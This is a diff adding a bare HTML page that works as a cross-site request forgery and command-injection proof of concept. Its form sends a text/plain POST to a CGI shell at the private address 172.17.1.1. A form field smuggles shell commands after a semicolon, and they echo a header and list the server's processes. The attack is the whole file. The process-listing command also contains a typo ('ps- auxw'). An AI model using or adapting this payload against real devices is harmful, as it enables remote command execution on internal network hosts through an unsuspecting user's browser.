@@ -1,0 +1,22 @@
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="X-UA-Compatible" content="ie=edge">
+    <title>Document</title>
+    <script>
+        function s() {
+            document.f.submit();
+        }
+    </script>
+</head>
+
+<body>
+    <form id="f" name="f" method="POST" enctype="text/plain" action="http://172.17.1.1/cgi-bin/sh">
+        <input type="text" name="X" value="X;echo 'Content-type:text/plain';echo;echo Current process;echo;ps- auxw;">
+        <input type="submit">
+    </form>
+</body>
+
+</html>
